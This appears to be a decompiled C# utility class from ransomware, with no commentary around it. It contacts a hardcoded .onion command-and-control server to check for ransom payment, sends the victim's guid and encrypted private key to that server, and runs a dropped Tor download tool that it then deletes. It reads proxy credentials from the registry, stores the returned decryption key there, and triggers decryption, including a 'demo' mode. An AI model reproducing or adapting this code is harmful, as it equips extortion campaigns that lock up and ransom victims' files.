using Microsoft.Win32;
using System;
using System.IO;
using wg.Properties;

namespace wg
{
	internal class Utils
	{
		private static string serverRequestMain = "http://4gxdnocmhl2tzx3z.onion/";

		private static string serverRequestPayment = "http://4gxdnocmhl2tzx3z.onion/?guid={0}&transId={1}&key={2}";

		private static string serverRequestMessage = "http://4gxdnocmhl2tzx3z.onion/?guid={0}&msg={1}";

		private static string TOR_GET_FNAME = "tg.exe";

		public static string REGISTRY_KEY = "Software\\WC";

		public static bool inetAvail = false;

		public static bool useProxy = false;

		public static string LastTransaction
		{
			get
			{
				string text = (string)Utils.RegGetVal(Utils.REGISTRY_KEY, "transaction_id");
				if (text != null)
				{
					return text;
				}
				return "";
			}
			set
			{
				Registry.CurrentUser.OpenSubKey(Utils.REGISTRY_KEY, true).SetValue("transaction_id", value);
			}
		}

		public static object RegGetVal(string subkey, string key)
		{
			object result;
			try
			{
				result = Registry.CurrentUser.OpenSubKey(subkey, false).GetValue(key);
			}
			catch
			{
				result = null;
			}
			return result;
		}

		public static void CheckInternetConnection()
		{
			if (!Utils.inetAvail)
			{
				Utils.inetAvail = Utils.CheckConnection(false);
				if (!Utils.inetAvail)
				{
					Utils.inetAvail = Utils.CheckConnection(true);
					Utils.useProxy = Utils.inetAvail;
				}
			}
		}

		public static bool IsPaymentReceived()
		{
			return Utils.RegGetVal(Utils.REGISTRY_KEY, "private_key") != null;
		}

		public static void Decrypt(bool demo)
		{
			string path = (string)Utils.RegGetVal(Utils.REGISTRY_KEY, "wc_path");
			string text = (string)Utils.RegGetVal(Utils.REGISTRY_KEY, "private_key");
			if (demo)
			{
				PS.ExecuteAndWait(path, "-dd demo");
				return;
			}
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			PS.ExecuteAndWait(path, "-dd " + text);
		}

		public static string MakeRequest(string URL, bool useProxy)
		{
			PS.RedirectOutput = true;
			string str = "";
			if (useProxy)
			{
				string text = (string)Utils.RegGetVal(Utils.REGISTRY_KEY, "Prx");
				string text2 = (string)Utils.RegGetVal(Utils.REGISTRY_KEY, "Cred");
				if (text == null)
				{
					return "";
				}
				if (text2 != null)
				{
					text = ((text.IndexOf("http://") != -1) ? text.Insert(7, text2 + "@") : text.Insert(8, text2 + "@"));
				}
				str = " -proxy " + text;
			}
			string arguments = "-iu " + URL + str;
			File.WriteAllBytes(Utils.TOR_GET_FNAME, Resources.tg);
			string arg_BD_0 = PS.ExecuteAndWait(Utils.TOR_GET_FNAME, arguments);
			File.Delete(Utils.TOR_GET_FNAME);
			PS.RedirectOutput = false;
			return arg_BD_0;
		}

		public static bool CheckConnection(bool useProxy)
		{
			return Utils.MakeRequest(Utils.serverRequestMain, useProxy).ToUpper().Replace("\r\n", "") == "OK";
		}

		public static int CheckPayment(string transactionId, bool useProxy)
		{
			string text = null;
			int result;
			try
			{
				string arg = (string)Utils.RegGetVal(Utils.REGISTRY_KEY, "guid");
				string text2 = (string)Utils.RegGetVal(Utils.REGISTRY_KEY, "private_key_encrypted");
				text = Utils.MakeRequest(string.Format(Utils.serverRequestPayment, arg, transactionId, text2.Replace("+", "-").Replace("/", "_").Replace("=", "")), useProxy);
				result = int.Parse(text);
			}
			catch
			{
				try
				{
					Convert.FromBase64String(text);
					Registry.CurrentUser.OpenSubKey(Utils.REGISTRY_KEY, true).SetValue("private_key", text);
					result = 0;
				}
				catch
				{
					result = -10;
				}
			}
			return result;
		}

		public static void SendMessage(string text, bool useProxy)
		{
			string arg = (string)Utils.RegGetVal(Utils.REGISTRY_KEY, "guid");
			Utils.MakeRequest(string.Format(Utils.serverRequestMessage, arg, text), useProxy);
		}
	}
}
